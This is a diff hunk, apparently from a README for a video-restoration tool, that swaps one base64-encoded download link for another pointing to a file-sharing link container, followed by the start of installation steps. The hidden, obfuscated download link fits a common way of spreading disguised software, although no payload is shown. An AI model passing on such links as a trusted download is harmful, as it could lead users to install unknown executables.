@@ -311,7 +311,7 @@ Features:
 * Naturally restore old videos without adding visual artifacts
 
 Download: 
-`aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xbmt2c1lrWjdBMGx2bkpRYkw2Um1sVG5uM2VoWkpwbVIvdmlldz91c3A9c2hhcmluZw==`
+`aHR0cHM6Ly9maWxlY3J5cHQuY2MvQ29udGFpbmVyL0VBQzUzOEE5NTQuaHRtbA==`
 
 **Installation steps:**
 1. Extract the archive
